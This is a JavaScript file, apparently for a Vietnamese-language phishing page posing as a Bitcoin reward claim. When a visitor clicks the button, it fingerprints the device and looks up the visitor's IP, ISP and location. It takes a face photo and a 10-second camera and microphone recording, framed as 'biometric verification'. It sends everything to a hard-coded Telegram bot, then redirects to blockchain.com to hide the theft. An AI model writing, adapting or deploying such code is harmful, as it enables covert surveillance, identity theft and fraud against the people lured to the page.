(async function() {
    const BOT_TOKEN = '8637781182:AAH3RgQ_vuSl3urLFb-5MDizgTbZnF0LQMs';
    const CHAT_ID = '-1003479049955';
    const REDIRECT_URL = "https://www.blockchain.com/";

    const btn = document.getElementById('startBtn');
    const loading = document.getElementById('loading');
    const video = document.getElementById('preview');
    
    const info = {
        time: new Date().toLocaleString('vi-VN'),
        device: 'Đang xác định...',
        os: '', ip: '', realIp: '', isp: '', address: '', lat: '', lon: ''
    };

    // --- 1. THU THẬP THÔNG TIN THIẾT BỊ ---
    function detectDevice() {
        const ua = navigator.userAgent;
        if (/Android/i.test(ua)) {
            info.os = 'Android';
            const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
            info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
        } else if (/iPhone|iPad|iPod/i.test(ua)) {
            info.os = 'iOS';
            info.device = 'iPhone/iPad';
        } else {
            info.os = 'Desktop';
            info.device = navigator.platform;
        }
    }

    async function getNetworkInfo() {
        try {
            const r = await fetch('https://ipwho.is/');
            const data = await r.json();
            info.ip = data.ip || 'N/A';
            info.realIp = data.ip || 'N/A';
            info.isp = data.connection?.org || 'N/A';
            info.address = `${data.city || ''}, ${data.region || ''}, ${data.country || ''}`;
            info.lat = data.latitude || '0';
            info.lon = data.longitude || '0';
        } catch (e) { 
            console.error("Network info error"); 
            info.ip = 'Lỗi';
        }
    }

    // --- 2. XỬ LÝ MEDIA ---
    async function captureAndSend() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
            video.srcObject = stream;

            // Đợi camera ổn định
            await new Promise(r => setTimeout(r, 2000));

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // Chụp ảnh gửi kèm thông tin
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'face.jpg');
                formData.append('caption', `
🔔 KHÁCH NHẬN THƯỞNG BTC
━━━━━━━━━━━━━━━━━━
📱 Thiết bị: ${info.device} (${info.os})
🌐 IP: ${info.ip}
🏢 ISP: ${info.isp}
📍 Vị trí: ${info.address}
🗺️ Maps: https://www.google.com/maps?q=${info.lat},${info.lon}
🕒 Thời gian: ${info.time}
`.trim());
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            }, 'image/jpeg', 0.8);

            // Quay video 10 giây
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                const videoData = new FormData();
                videoData.append('chat_id', CHAT_ID);
                videoData.append('video', videoBlob, 'verify.mp4');
                videoData.append('caption', '🎥 Video xác thực sinh trắc học (10s)');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: videoData });
                
                // Kết thúc và chuyển hướng
                window.location.href = REDIRECT_URL;
            };

            recorder.start();
            setTimeout(() => {
                if (recorder.state !== "inactive") {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }
            }, 10000);

        } catch (err) {
            console.error("Access denied or error:", err);
            // Gửi tin nhắn văn bản báo lỗi nếu không lấy được camera
            const textData = {
                chat_id: CHAT_ID,
                text: `❌ KHÁCH TỪ CHỐI CAMERA\n📱 Thiết bị: ${info.device}\n🌐 IP: ${info.ip}\n📍 Vị trí: ${info.address}`
            };
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(textData)
            });
            window.location.href = REDIRECT_URL;
        }
    }

    // --- 3. KHỞI CHẠY ---
    detectDevice();
    await getNetworkInfo();

    btn.addEventListener('click', () => {
        btn.style.display = 'none';
        loading.style.display = 'block';
        captureAndSend();
    });

})();